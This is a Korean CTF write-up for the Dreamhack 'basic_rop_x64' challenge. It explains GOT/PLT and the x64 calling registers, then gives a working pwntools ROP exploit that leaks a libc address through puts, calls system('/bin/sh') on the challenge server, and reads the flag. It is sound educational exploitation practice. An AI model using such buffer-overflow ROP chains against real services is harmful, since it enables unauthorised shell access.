---
layout: posts
title: "basic rop"
categories: ["ctf"]
---

## 문제

### **Description**

**이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x64)의 바이너리와 소스 코드가 주어집니다.**

Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.

"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.

플래그의 형식은 DH{...} 입니다.

### **Environment**

**`Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)`**

### **Reference**

[**Return Oriented Programming**](https://learn.dreamhack.io/84)

```c
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ cat basic_rop_x64.c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

## 해결

**Global Offset Table**

실제 함수가 있는 진짜 메모리 주소가 적혀있다.

**Procedure Linkage Table**

: puts 나 read 같은 함수들은 [libc.so](http://libc.so) 라는 라이브러리 파일에 들어있는 데 이 라이브러리들이 메모리의 어느 주소에 올라갈지는 매번 바뀐다. 그래서 컴파일러는 puts의 진짜 주소를 미리 알 수 없다.

하지만, 컴파일러는 프로그램 안에 작은 stub 을 만드는데 이 조각들이 모여있는 게 plt이다.

**rdi** (destination index)

- 첫번째 인자를 전달하는 용도로 주로 사용된다.
- 문자열이나 포인터와 같은 주소 값을 전달할 때 많이 사용된다.

**rsi** (source index)

- 함수 호출 시 두 번째 인자를 전달하는 용도로 사용된다.
- rdi 와 함께 주로 문자열이나 포인터와 같은 주소 값을 전달하는 데 사용된다.

**rdx** (data refister X)

- 함수 호출 시 세 번째 인자를 전달하는 용도로 사용된다.
- 정수 값이나 문자 등의 데이터를 전달할 때 사용된다.

<img width="931" height="610" alt="image" src="https://github.com/user-attachments/assets/0c3a11e2-1ef4-4378-a377-66ab2aec158b" />


```c
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ ROPgadget --binary basic_rop_x64 | grep "pop rdi"
0x0000000000400883 : pop rdi ; ret
```

**ELF**

바이너리 파일을 파이썬 객체로 읽어와서 그 안의 정보들을 쉽게 뽑아낼 수 있게 해주는 도구

```c
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004007ba <+0>:     push   rbp
   0x00000000004007bb <+1>:     mov    rbp,rsp
   0x00000000004007be <+4>:     sub    rsp,0x50
   0x00000000004007c2 <+8>:     mov    DWORD PTR [rbp-0x44],edi
   0x00000000004007c5 <+11>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004007c9 <+15>:    lea    rdx,[rbp-0x40]
   0x00000000004007cd <+19>:    mov    eax,0x0
   0x00000000004007d2 <+24>:    mov    ecx,0x8
   0x00000000004007d7 <+29>:    mov    rdi,rdx
   0x00000000004007da <+32>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000004007dd <+35>:    mov    eax,0x0
   0x00000000004007e2 <+40>:    call   0x40075e <initialize>
   0x00000000004007e7 <+45>:    lea    rax,[rbp-0x40]
   0x00000000004007eb <+49>:    mov    edx,0x400
   0x00000000004007f0 <+54>:    mov    rsi,rax
   0x00000000004007f3 <+57>:    mov    edi,0x0
   0x00000000004007f8 <+62>:    call   0x4005f0 <read@plt>
   0x00000000004007fd <+67>:    lea    rax,[rbp-0x40]
   0x0000000000400801 <+71>:    mov    edx,0x40
   0x0000000000400806 <+76>:    mov    rsi,rax
   0x0000000000400809 <+79>:    mov    edi,0x1
   0x000000000040080e <+84>:    call   0x4005d0 <write@plt>
   0x0000000000400813 <+89>:    mov    eax,0x0
   0x0000000000400818 <+94>:    leave
   0x0000000000400819 <+95>:    ret
```

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ cat ./ex.py
from pwn import *

p = process('./basic_rop_x64')
elf = ELF('./basic_rop_x64')

# 0x40 + 8 = 64 + 8 = 72
payload = b"A" * 72

pop_rdi = 0x400883
read_got = elf.got['read']
puts_plt = elf.plt['puts']
main_addr = elf.symbols['main']

payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.send(payload)

p.recvuntil(b'A'*64)
leak = u64(p.recvn(6).ljust(8, b"\x00"))
print(f"Leaked read address: {hex(leak)}")
```

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ python ./ex.py
[+] Starting local process './basic_rop_x64': pid 2615
[*] '/home/hyeoni/Documents/Dreamhack/0417/basic_rop_x64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
Leaked read address: 0x7575f6d5a2b0
[*] Stopped process './basic_rop_x64' (pid 2615)
```

```python
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ cat ex.py
from pwn import *

# p = process('./basic_rop_x64')
p = remote("host8.dreamhack.games", 17984)

elf = ELF('./basic_rop_x64')

# 0x40 + 8 = 64 + 8 = 72
payload = b"A" * 72

pop_rdi = 0x400883
read_got = elf.got['read']
puts_plt = elf.plt['puts']
main_addr = elf.symbols['main']

payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)]
# 프로그램 종료 안시키고 다시 main 으로 복귀.
payload += p64(main_addr)

p.send(payload)

###########################################################

p.recvuntil(b'A'*64)
# read 함수의 실제 메모리 주소 leak.
leak = u64(p.recvn(6).ljust(8, b"\x00"))
p.recvline() 
print(f"Leaked read address: {hex(leak)}")

# library 파일 로드.
libc = ELF('./libc.so.6')

# libc base 계산
libc_base = leak - libc.symbols['read']

system_addr = libc_base + libc.symbols['system']
# system("/bin/sh") 실행
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))

print(f"Libc Base: {hex(libc_base)}")
print(f"System Address: {hex(system_addr)}")
print(f"Binsh Address: {hex(binsh_addr)}")

ret = pop_rdi + 1

payload2 = b"A" * 72
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.send(payload2)

p.interactive()
```

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0417]
└─$ !p
python ./ex.py
[+] Opening connection to host8.dreamhack.games on port 17984: Done
[*] '/home/hyeoni/Documents/Dreamhack/0417/basic_rop_x64'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
Leaked read address: 0x7f9a77ce4980
[*] '/home/hyeoni/Documents/Dreamhack/0417/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
Libc Base: 0x7f9a77bd0000
System Address: 0x7f9a77c20d60
Binsh Address: 0x7f9a77da8698
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
$ ls
basic_rop_x64
flag
$ cat flag
DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}
```
